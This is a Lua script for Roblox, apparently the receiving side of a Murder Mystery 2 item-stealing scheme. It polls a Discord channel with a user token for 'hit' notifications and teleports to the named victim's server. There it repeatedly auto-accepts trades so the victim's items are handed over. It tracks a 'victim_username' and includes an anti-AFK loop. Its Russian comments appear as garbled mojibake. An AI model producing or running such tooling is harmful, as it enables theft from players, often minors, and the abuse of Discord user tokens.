if not game:IsLoaded() then
    game.Loaded:Wait()
    print("‚úÖ –ò–≥—Ä–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–∞")
end

-- –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–∫–µ–Ω–∞ –∏ ID –∫–∞–Ω–∞–ª–∞
if token == "" or channelId == "" then
    game.Players.LocalPlayer:Kick("‚ùå –î–æ–±–∞–≤—å —Ç–æ–∫–µ–Ω –∏ channelId –≤ —Å–∫—Ä–∏–ø—Ç!")
    return
end

-- Anti-AFK
local VirtualUser = game:GetService('VirtualUser')
game:GetService('Players').LocalPlayer.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
    print("üîÑ Anti-AFK –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω")
end)

local function selectDevice()
    local DeviceSelectGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeviceSelect")
    if DeviceSelectGui then
        local button = DeviceSelectGui.Container.Phone.Button
        local centerX = button.AbsolutePosition.X + button.AbsoluteSize.X/2
        local centerY = button.AbsolutePosition.Y + button.AbsoluteSize.Y/2
        game:GetService("VirtualInputManager"):SendMouseButtonEvent(centerX, centerY, 0, true, game, 1)
        task.wait(0.1)
        game:GetService("VirtualInputManager"):SendMouseButtonEvent(centerX, centerY, 0, false, game, 1)
        print("–í—ã–±—Ä–∞–Ω–æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: Phone")
    end
end

-- –ù–∞—Å—Ç—Ä–æ–π–∫–∏ —Ñ–∞–π–ª–æ–≤
local HttpService = game:GetService("HttpService")
if not isfile("user.txt") then writefile("user.txt", "victim_username") end
if not isfile("joined_ids.txt") then writefile("joined_ids.txt", "[]") end

local victimUser = readfile("user.txt")
local joinedIds = HttpService:JSONDecode(readfile("joined_ids.txt"))
local isTeleporting = false

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–∞—Ä—Å–∏–Ω–≥–∞ –∫–æ–º–∞–Ω–¥—ã —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏–∏
local function findTeleportCommand(content)
    if not content then return nil, nil end
    
    -- –ò—â–µ–º –≤ —Ñ–æ—Ä–º–∞—Ç–µ: TeleportService:TeleportToPlaceInstance(placeId, "jobId")
    local placeId, jobId = content:match('TeleportService:TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
    
    -- –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –ø–æ–∏—Å–∫ (–µ—Å–ª–∏ –ø–µ—Ä–≤—ã–π –≤–∞—Ä–∏–∞–Ω—Ç –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª)
    if not placeId or not jobId then
        placeId, jobId = content:match('game:GetService%("TeleportService"%):TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
    end
    
    return placeId, jobId
end

-- –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ Discord
local function checkDiscord()
    local response = request({
        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=5",
        Method = "GET",
        Headers = {
            ['Authorization'] = token,
            ['Content-Type'] = 'application/json'
        }
    })

    if not response.Success then
        warn("‚ùå –û—à–∏–±–∫–∞ Discord API: "..response.StatusCode)
        return
    end

    local messages = HttpService:JSONDecode(response.Body)
    for _, msg in ipairs(messages) do
        if msg.embeds and msg.embeds[1] and msg.embeds[1].title:find("Join to get MM2 hit") then
            print("üîç –ù–∞–π–¥–µ–Ω–æ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å —Ö–∏—Ç–æ–º!")
            
            local placeId, jobId = findTeleportCommand(msg.content)
            if placeId and jobId then
                print("üéØ –ù–∞–π–¥–µ–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏–∏:")
                print("   PlaceID:", placeId)
                print("   JobID:", jobId)
                
                if not table.find(joinedIds, msg.id) then
                    table.insert(joinedIds, msg.id)
                    writefile("joined_ids.txt", HttpService:JSONEncode(joinedIds))
                    
                    print("üöÄ –¢–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä...")
                    isTeleporting = true
                    game:GetService("TeleportService"):TeleportToPlaceInstance(tonumber(placeId), jobId)
                    return
                else
                    print("‚ö†Ô∏è –£–∂–µ –ø—Ä–∏—Å–æ–µ–¥–∏–Ω—è–ª–∏—Å—å –∫ —ç—Ç–æ–º—É —Ö–∏—Ç—É")
                end
            else
                print("‚ùå –ù–µ –Ω–∞–π–¥–µ–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏–∏ –≤ content:")
                print(msg.content)
            end
        end
    end
end

-- –ê–≤—Ç–æ–ø—Ä–∏–Ω—è—Ç–∏–µ —Ç—Ä–µ–π–¥–æ–≤
local function autoAcceptTrade()
    while task.wait(1) do
        pcall(function()
            game:GetService("ReplicatedStorage").Trade.AcceptRequest:FireServer()
            game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer()
        end)
    end
end

-- –ó–∞–ø—É—Å–∫
task.spawn(autoAcceptTrade)

print("‚ú® –°–∫—Ä–∏–ø—Ç –∑–∞–ø—É—â–µ–Ω! –û–∂–∏–¥–∞–Ω–∏–µ –Ω–æ–≤—ã—Ö —Ö–∏—Ç–æ–≤...")
while task.wait(10) do
    if not isTeleporting then
        pcall(checkDiscord)
    end
end
